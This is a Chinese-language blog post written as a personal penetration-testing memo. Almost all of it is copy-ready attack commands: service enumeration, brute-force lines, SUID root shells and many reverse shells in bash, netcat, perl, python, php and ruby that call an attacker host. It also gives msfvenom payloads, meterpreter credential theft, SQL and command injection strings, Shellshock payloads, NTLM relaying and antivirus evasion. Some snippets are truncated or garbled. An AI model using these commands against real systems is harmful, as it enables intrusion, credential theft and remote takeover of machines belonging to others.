---
title: 小本本--备忘录
tags:
  - 备忘录
categories:
  - 杂项
copyright: true
abbrlink: 554d428f
date: 2019-02-09 17:02:18
---

![](https://ae01.alicdn.com/kf/HTB1NN5aav1H3KVjSZFHq6zKppXaI.jpg)
<!--more-->

## <center>枚举</center> ##

### 常规枚举 ###

显示详细信息，同步，扫描所有端口，使用所有脚本，不探测主机是否存活

```bash
nmap -vv -Pn -A -sC -sS -T 4 -p- 192.168.1.1
```

显示详细信息，SYN扫描，版本信息和针对服务的脚本。

```bash
nmap -v -sS -A -T4 192.168.1.1
```

扫描易受攻击的SMB服务器的Nmap脚本

注意：unsafe = 1可能会导致中断

```bash
nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 [host]
```

获取同网段其他主机

```bah
netdiscover -r 192.168.1.0/24
```

### FTP (21) ###
```bash
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.1.1
```
### SSH (22) ###
```bash
ssh [ip] 22
```
### SMTP (25) ###
```bash
nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 192.168.1.1

nc -nvv [ip] 25

telnet [ip] 25
```

### Web (80/443) ###

birbuster(GUI)

```bash
dirb http://192.168.1.1/

nikto -h 192.168.1.1
```
### Pop3 (110) ###

telnet [ip] 110

USER [username]

PASS [password]

列出信息
`LIST`

查找邮件
`RETR [message number]`

### RPCBind (111) ###

```bash
rpcinfo –p 192.168.1.1
```

### SMB\RPC (139/445) ###

```bahs
enum4linux –a 192.168.1.1
```

枚举子网上的Windows/Samba服务器，查找Windows MAC地址，netbios名称并发现客户端工作组/域

```bash
nbtscan 192.168.1.1
```

```bash
python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.1.1
```

```bash
nmap IPADDR --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse
```

列出Ipc共享
```bash
smbclient -L //192.168.1.X/

smbclient //192.168.1.X/ipc$ -U user
```

### SNMP (161) ###

```bash
snmpwalk -c public -v1 10.0.0.0

snmpcheck -t 192.168.1.X -c public

onesixtyone -c names -i hosts

nmap -sT -p 161 192.168.X.X -oG snmp_results.txt

snmpenum -t 192.168.1.X
```

### Oracle (1521) ###

```bash
tnscmd10g version -h 192.168.X.X

tnscmd10g status -h 192.168.X.X
```

### Mysql (3306) ###
```bash
nmap -sV -Pn -vv  192.168.1.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
```

### DNS区域传输 ###

```bash
nslookup -> set type=any -> ls -d baidu.com

dig axfr baidu.com @ns1.baidu.com
```

```bash
dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
```

### 挂载文件共享 ###

`showmount -e`

将共享挂载到/ mnt / nfs而不锁定它
```bash
mount 192.168.1.1:/vol/share /mnt/nfs  -nolock
```
在Linux上挂载Windows CIFS/SMB共享位于/mnt/cifs如果删除密码，它将在CLI上提示

```bash
mount -tcifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs
```

### 指纹识别 ###

通过显示横幅进行基本版本控制/指纹识别

```bash
nc -v 192.168.1.1 25

telnet 192.168.1.1 25
```
### 搜索利用exp ###

```bash
searchsploit windows 2003 | grep -i local
```
### 编译EXP ###
编译C代码，在'gcc'之后添加`-m32`，用于在64位Linux上编译32位代码,不添加则编译64位的exp

```bash
gcc -o exploit exploit.c
```
在Linux上编译windows .exe

```bash
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
```

### 检测数据包 ###
tcpdump用于接口eth0上的端口80，输出到output.pcap

```bash
tcpdump tcp port 80 -w output.pcap -i eth0
```
### 密码破解 ###
```bash
hash-identifier [hash]

john hashes.txt

hashcat -m 500 -a 0 -o output.txt –remove hashes.txt /usr/share/wordlists/rockyou.txt
```
https://hashcat.net/wiki/doku.php?id=example_hashes
https://hashkiller.co.uk/

### 暴力破解 ###
web post表单

```bash
hydra 10.0.0.1 http-post-form “/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid” -P /usr/share/wordlists/rockyou.txt -l admin
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -o results.txt [ip] [协议]
```

爆破SMTP

```bash
hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp –V
```

## <center>Shells & Reverse Shells</center> ##

### SUID C Shells ###

**/bin/bash**

```c
int main(void){
setresuid(0, 0, 0);
system("/bin/bash");
}
```

**/bin/sh**

```c
int main(void){
setresuid(0, 0, 0);
system("/bin/sh");
}
```

### TTY Shell ###
```bash
python -c 'import pty;pty.spawn("/bin/bash")'

echo os.system('/bin/bash')

/bin/sh –i

execute('/bin/sh')

!sh #nmap

"!bash #vi
```

### Spawn Ruby Shell ###

```bash
exec "/bin/sh"

ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d
```

### Netcat ###

````bash
nc -e /bin/sh ATTACKING-IP 80

/bin/sh | nc ATTACKING-IP 80

rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```

### telnet反弹Shell ###

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

### PHP ###

假设TCP使用文件描述符3.如果它不起作用，请尝试4,5或6）
```bash
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Bash ###

```bash
exec /bin/bash 0&0 2>&0

0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196

exec 5<>/dev/tcp/ATTACKING-IP/80 cat <&5 | while read line; do $line 2>&5 >&5; done

bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
```

### Perl ###

```bash
exec "/bin/sh";

perl —e 'exec "/bin/sh";'

perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## <center>Meterpreter</center> ##

### Windows ###

```bash
set payload windows/meterpreter/reverse_tcp
```
### Windows VNV ###

```bash
set payload windows/vncinject/reverse_tcp

set ViewOnly false
```
### Linux ###

```bash
set payload linux/meterpreter/reverse_tcp
```

### msf备忘 ###

上传文件

`upload file c:\\windows`

下载文件

`download c:\\windows\\repair\\sam /tmp`

运行exe

`execute -f c:\\windows\temp\exploit.exe`

使用cmd shell创建新通道

`execute -f cmd -c`

端口转发

`portfwd add –l 3389 –p 3389 –r target`

关闭端口转发

`portfwd delete –l 3389 –p 3389 –r target`

Bypass UAC

`use exploit/windows/local/bypassuac`

HTTP目录扫描

`use auxiliary/scanner/http/dir_scanner`

扫描JBOSS漏洞

`use auxiliary/scanner/http/jboss_vulnscan`

扫描MSSQL密码

`use auxiliary/scanner/mssql/mssql_login`

扫描MSSQL版本

`use auxiliary/scanner/mysql/mysql_version`

Oracle登录模块

`use auxiliary/scanner/oracle/oracle_login`

powershell有效负载模块

`use exploit/multi/script/web_delivery`

通过会话上传和运行powershell脚本

`post/windows/manage/powershell/exec_powershell`

部署JBOSS

`use exploit/multi/http/jboss_maindeployer`

MSSQL有效负载

`use exploit/windows/mssql/mssql_payload`

显示当前用户的权限

`run post/windows/gather/win_privs`

抓取GPP保存的密码

`use post/windows/gather/credentials/gpp`

加载Mimikatz/kiwi并获得凭证

`load kiwi`

`creds_all`

识别所提供的域用户具有管理访问权限的其他计算机

`run post/windows/gather/local_admin_search_enum`

`set AUTORUNSCRIPT post/windows/manage/migrate`

### msf payloads ###

列出选项

`msfvenom –l`

### 二进制 ###

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf

msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe

msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho
```

### Web payloads ###

PHP

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw > shell.php

cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

监听

```bash
set payload php/meterpreter/reverse_tcp
```

ASP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
```

JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
```

WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
```

### 脚本 payloads ###

Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
```

Bash

```bash
msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
```

Perl

```bash
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
```

### shellcode ###

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f

msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f

msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f
```

### Handlers ###
msf常用

```bash
exploit/multi/handler

set PAYLOAD

set LHOST

set LPORT

set ExitOnSession false

exploit -j -z
```
**Demo**

```bash
msfvenom exploit/multi/handler -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f > exploit.extension
```

## <center>Powershell</center> ##

执行旁路

```bash
Set-ExecutionPolicy Unrestricted
./file.ps1
```

```bash
Import-Module script.psm1
Invoke-FunctionThatIsIntheModule
```

```bash
iex(new-object system.net.webclient).downloadstring(“file:///C:\examplefile.ps1”)
```
Powershell.exe被阻止

Use 'not powershell' https://github.com/Ben0xA/nps

## <center>提权</center> ##

### Linux ###

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

https://github.com/pentestmonkey/unix-privesc-check

### Windows ###

https://github.com/pentestmonkey/windows-privesc-check

http://www.fuzzysecurity.com/tutorials/16.html

https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

## <center>命令行注入</center> ##

### 遍历文件 ##

`website.com/file.php[?path=/]`

### 使用curl探测HTTP options ###

`curl -vX OPTIONS [website]`

### 使用CURL将文件上传到具有PUT方法的网站 ###

```bash
curl --upload-file shell.php --url http://192.168.218.139/test/shell.php --http1.0
```
### 传输文件 ###

```bash
?path=/;wget http://IPADDRESS:8000/FILENAME.EXTENTION;
```

### 连接shell ###

```bash
;php -f filelocation.php
```

## <center>SQL注入</center> ##

### 注入 ###

登录表单的常见注入:

- admin' --
- admin' #
- admin'/*
- ' or 1=1--
- ' or 1=1#
- ' or 1=1/*
- ') or '1'='1--
- ') or ('1'='1---


### SQLMap ###

自动sqlmap扫描

```bash
sqlmap -u http://demo.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3
```

```bash
sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
```

有针对性的sqlmap扫描

```bash
sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php"
```

```bash
sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump Scan url for union + error based injection with mysql backend and use a random user agent + database dump
```

sqlmap检查表单注入

```bash
sqlmap -o -u "http://meh.com/form/" –forms
```

dump数据库

```bash
sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users –dump
```

刷新会话

```bash
sqlmap --flush session
```

尝试使用布尔技术来利用“用户”字段。

```bash
sqlmap -p user --technique=B
```

Post

```bash
sqlmap -r demo.txt
```

## 其他 ##

使用mitm6的NTLMRelayx.py

使用mitm6通过IPv6欺骗获取捕获的凭据，并通过ntlmrelayx.py将其转发到目标。它需要安装ntlmrelayx.py和mitm6。

```bash
mitm6 -d <domain.local>

ntlmrelayx.py -6 -wh 192.168.1.1 -t smb://192.168.1.2 -l ~/tmp/
```

### 隧道 ###

sshuttle是一个很棒的隧道工具，它摆脱了对代理链的需求。以下命令的作用是通过10.0.0.1隧道传输流量，并为通过sshuttle隧道发往10.10.10.0/24的所有流量建立路由。

```bash
sshuttle -r root@10.0.0.1 10.10.10.0/24
```

### AV Bypass ###

需要安装wine和hyperion。

```bash
wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe
```
### Web主机（传输文件） ###

```bash
python -m SimpleHTTPServer 80
```

### PHP msf shell ###

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4444 R > phpmeterpreter.php
```

### Netcat ###

监听

nc -lvp <PORT>

反弹

nc -e /bin/bash ip port

ncat -v -l -p 7777 -e /bin/bash

通过ncat下载文件

```bash
cat happy.txt | ncat -v -l -p 5555 
ncat localhost 5555 > happy_copy.txt 
```

### 使用解释器反弹shell ###

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Python

```bash
python -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
```

### Shellshock ###

CURL

```bash
curl -x TARGETADDRESS -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/HOSTIP/1234 0>&1" TARGETADDRESS/cgi-bin/status
```

```bash
curl -x 192.168.28.167:PORT -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/192.168.28.169/1234 0>&1" 192.168.28.167/cgi-bin/status
```

SSH

```bash
ssh username@IPADDRESS '() { :;}; /bin/bash'
```